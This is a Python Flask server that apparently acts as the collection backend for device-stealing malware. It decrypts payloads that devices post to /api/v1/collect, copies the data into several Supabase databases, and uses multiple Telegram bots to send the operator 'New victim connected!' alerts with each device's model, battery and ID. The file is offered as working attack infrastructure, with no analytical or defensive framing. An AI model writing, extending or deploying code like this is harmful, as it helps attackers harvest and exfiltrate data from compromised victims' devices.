import os
import json
import base64
import logging
import requests
from flask import Flask, request, jsonify
from supabase import create_client
from server.core.security_shield import SecurityShield

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

master_secret_b64 = os.environ.get('MASTER_SECRET_B64')
salt = os.environ.get('SALT', 'default_salt')

if not master_secret_b64:
    raise ValueError("MASTER_SECRET_B64 is required in Environment Variables")

master_secret = base64.b64decode(master_secret_b64)
shield = SecurityShield(master_secret, salt.encode())

def send_to_all_supabase(device_id, decrypted_data):
    for i in range(1, 5):
        url = os.environ.get(f'SUPABASE_URL_{i}')
        key = os.environ.get(f'SUPABASE_KEY_{i}')
        if url and key:
            try:
                client = create_client(url, key)
                client.table('client_info').upsert(decrypted_data).execute()
                logger.info(f"Data saved to Supabase {i}")
            except Exception as e:
                logger.error(f"Error Supabase {i}: {e}")

def notify_all_telegram(device_id, decrypted_data):
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    if not chat_id:
        return
    model = decrypted_data.get('model', 'Unknown')
    battery = decrypted_data.get('battery_level', '??')
    message = f"New victim connected!\nDevice: {model}\nBattery: {battery}%\nID: {device_id}"
    for i in range(1, 11):
        token = os.environ.get(f'TELEGRAM_TOKEN_{i}')
        if token:
            try:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                requests.post(url, json={'chat_id': chat_id, 'text': message}, timeout=5)
            except Exception as e:
                logger.error(f"Error Telegram Bot {i}: {e}")

@app.route('/api/v1/collect', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "invalid json"}), 400
        device_id = data.get('device_id')
        encrypted_payload = data.get('payload')
        if not device_id or not encrypted_payload:
            return jsonify({"error": "missing fields"}), 400
        decrypted_dict = shield.process_incoming_data(encrypted_payload, device_id)
        decrypted_dict['device_id'] = device_id
        send_to_all_supabase(device_id, decrypted_dict)
        notify_all_telegram(device_id, decrypted_dict)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.exception("Decryption or broadcast error")
        return jsonify({"error": "processing failed"}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
